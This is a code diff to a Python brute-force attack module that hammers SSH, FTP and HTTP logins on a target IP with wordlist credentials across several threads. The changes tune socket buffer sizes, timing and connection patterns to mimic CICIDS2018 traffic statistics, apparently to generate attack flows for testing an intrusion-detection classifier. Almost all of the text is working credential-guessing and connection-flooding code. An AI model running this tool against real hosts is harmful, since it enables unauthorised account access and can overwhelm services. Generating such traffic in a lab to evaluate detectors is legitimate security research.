@@ -20,9 +20,25 @@ import string
 import struct
 
 # TCP receive buffer size matching CICIDS2018 training data.
-# Setting SO_RCVBUF before connect() controls the TCP SYN window size,
-# which the model uses for classification (Init Fwd Win Byts feature).
-_RCVBUF_BRUTE = 8192        # Training mode: 8192 (56.8% of TCP flows) ✓
+# Setting SO_RCVBUF before connect() controls the TCP SYN window size.
+#
+# SSH-Bruteforce training (n=188K, Wed-14-02-2018):
+#   Init Fwd Win Byts: median=26883 (standard Linux default)
+#   Tot Fwd Pkts: median=19 (full SSH handshake + auth)
+#   Flow Duration: median=115876 µs (~116ms)
+#
+# FTP-Bruteforce training (n=193K, Wed-14-02-2018):
+#   Init Fwd Win Byts: median=26883
+#   Tot Fwd Pkts: median=1 (SYN only - server overwhelmed)
+#   Flow Duration: median=2 µs (microseconds!)
+#
+# Brute Force-Web training (n=249, Thu-22-02-2018):
+#   Init Fwd Win Byts: median=8192
+#   Tot Fwd Pkts: median=4
+#   Flow Duration: median=5005257 µs (~5 sec)
+_RCVBUF_BRUTE_SSH = 26883    # SSH training median: 26883
+_RCVBUF_BRUTE_FTP = 26883    # FTP training median: 26883
+_RCVBUF_BRUTE_WEB = 8192     # Web training median: 8192
 
 # ──────────────────────────────────────────────────────────
 # Credential wordlists (matching Patator-style attacks)
@@ -56,9 +72,12 @@ def _random_string(length=10):
 
 
 class BruteForceAttack:
-    def __init__(self, target_ip, duration=60):
+    def __init__(self, target_ip, duration=60, ssh_port=22, ftp_port=21, http_port=80):
         self.target_ip = target_ip
         self.duration = duration
+        self.ssh_port = ssh_port
+        self.ftp_port = ftp_port
+        self.http_port = http_port
         self.running = True
         self.attempt_count = 0
         self.lock = threading.Lock()
@@ -101,14 +120,14 @@ class BruteForceAttack:
                     try:
                         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         raw_sock.settimeout(5)
-                        raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
-                        raw_sock.connect((self.target_ip, 22))
+                        raw_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE_SSH)
+                        raw_sock.connect((self.target_ip, self.ssh_port))
 
                         client = paramiko.SSHClient()
                         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                         client.connect(
                             self.target_ip,
-                            port=22,
+                            port=self.ssh_port,
                             username=username,
                             password=password,
                             timeout=5,
@@ -183,8 +202,8 @@ class BruteForceAttack:
                     try:
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         sock.settimeout(5)
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
-                        sock.connect((self.target_ip, 22))
+                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE_SSH)
+                        sock.connect((self.target_ip, self.ssh_port))
 
                         # 1. Read server SSH banner
                         banner = sock.recv(1024)
@@ -217,56 +236,77 @@ class BruteForceAttack:
 
     # ──────────────────────────────────────────────────────
     # FTP Brute Force (Patator-style)
-    #   Proper FTP protocol: read banner, USER, PASS, QUIT.
-    #   Each connection has enough packets for CICFlowMeter
-    #   to build a meaningful flow.
     #
-    #   CICFlowMeter signature:  Dst Port = 21, bidirectional
-    #   traffic (server sends response codes), characteristic
-    #   packet sizes for FTP command/response.
+    #   CICIDS2018 training data (n=193K, Wed-14-02-2018):
+    #     Dst Port: 21
+    #     Tot Fwd Pkts: median=1 (SYN only!)
+    #     Tot Bwd Pkts: median=1 (SYN-ACK only)
+    #     TotLen Fwd Pkts: median=0 (no payload)
+    #     Flow Duration: median=2 µs (microseconds!)
+    #     Fwd Pkts/s: median=500,000
+    #     Init Fwd Win Byts: median=26883
+    #     Init Bwd Win Byts: median=0
+    #     Down/Up Ratio: median=1
+    #     PSH Flag Cnt: median=1
+    #
+    #   The Patator FTP brute force overwhelms the FTP server so that
+    #   most flows are just SYN+SYN-ACK (~2µs). Only a small fraction
+    #   of connections actually complete the FTP login cycle.
+    #
+    #   We replicate this with 70% rapid connect+close, 30% full FTP.
     # ──────────────────────────────────────────────────────
     def ftp_brute_force(self):
-        """FTP brute force: Full FTP login cycle for each attempt.
-        Banner → USER → PASS → (fail) → QUIT.
-        Each attempt is a separate flow to port 21."""
+        """FTP brute force: 70% rapid connect+close, 30% full FTP login cycle.
+        Matches training profile of mostly micro-flows with occasional full exchanges."""
         end_time = time.time() + self.duration
 
         while self.running and time.time() < end_time:
-            for username in USERNAMES:
-                for password in PASSWORDS:
-                    if not self.running or time.time() >= end_time:
-                        return
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE_FTP)
+                sock.connect((self.target_ip, self.ftp_port))
 
+                if random.random() < 0.30:
+                    # 30%: Full FTP login cycle (Banner → USER → PASS → QUIT)
+                    username = random.choice(USERNAMES)
+                    password = random.choice(PASSWORDS)
+                    
+                    # Read FTP banner (220 message)
                     try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(5)
-                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
-                        sock.connect((self.target_ip, 21))
-
-                        # Read FTP banner (220 message)
                         sock.recv(1024)
+                    except socket.timeout:
+                        pass
 
-                        # Send USER command
-                        sock.sendall(f"USER {username}\r\n".encode())
-                        sock.recv(1024)  # 331 Password required
+                    # Send USER command
+                    sock.sendall(f"USER {username}\r\n".encode())
+                    try:
+                        sock.recv(1024)
+                    except socket.timeout:
+                        pass
 
-                        # Send PASS command
-                        sock.sendall(f"PASS {password}\r\n".encode())
-                        response = sock.recv(1024)  # 230 (success) or 530 (failed)
+                    # Send PASS command
+                    sock.sendall(f"PASS {password}\r\n".encode())
+                    try:
+                        sock.recv(1024)
+                    except socket.timeout:
+                        pass
 
-                        # Send QUIT regardless of result
-                        try:
-                            sock.sendall(b"QUIT\r\n")
-                            sock.recv(1024)  # 221 Goodbye
-                        except Exception:
-                            pass
-
-                        sock.close()
+                    # Send QUIT
+                    try:
+                        sock.sendall(b"QUIT\r\n")
+                        sock.recv(1024)
                     except Exception:
                         pass
 
-                    self._inc_count()
-                    time.sleep(random.uniform(0.05, 0.3))
+                # All paths: close quickly
+                sock.close()
+            except Exception:
+                pass
+
+            self._inc_count()
+            # Rapid: very short delay between connection attempts
+            time.sleep(random.uniform(0.001, 0.01))
 
     # ──────────────────────────────────────────────────────
     # Web Brute Force (HTTP POST login form)
@@ -295,8 +335,8 @@ class BruteForceAttack:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(10)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE)
-                sock.connect((self.target_ip, 80))
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_BRUTE_WEB)
+                sock.connect((self.target_ip, self.http_port))
 
                 # Send 1 login attempt per connection (matching training ~4 fwd pkts)
                 username = random.choice(USERNAMES)
@@ -334,7 +374,7 @@ class BruteForceAttack:
         """Run brute force attack with multiple threads."""
         print(f"[BruteForce] Starting attack on {self.target_ip} for {self.duration}s")
         print(f"[BruteForce] Techniques: SSH-Patator + FTP-Patator + Web Brute Force")
-        print(f"[BruteForce] Targeting SSH (22), FTP (21), HTTP (80) with {num_threads} threads")
+        print(f"[BruteForce] Targeting SSH ({self.ssh_port}), FTP ({self.ftp_port}), HTTP ({self.http_port}) with {num_threads} threads")
 
         techniques = [
             self.ssh_brute_force_paramiko,
@@ -360,9 +400,10 @@ class BruteForceAttack:
         print(f"[BruteForce] Attack completed in {elapsed:.2f}s — Made {self.attempt_count} attempts")
 
 
-def run_brute_force(target_ip, duration=60, threads=4):
-    """Convenience function to run brute force attack"""
-    attack = BruteForceAttack(target_ip, duration)
+def run_brute_force(target_ip, target_port=22, duration=60, threads=4):
+    """Convenience function to run brute force attack.
+    target_port is used as the SSH port (primary target)."""
+    attack = BruteForceAttack(target_ip, duration, ssh_port=target_port)
     attack.run_attack(num_threads=threads)
 
 
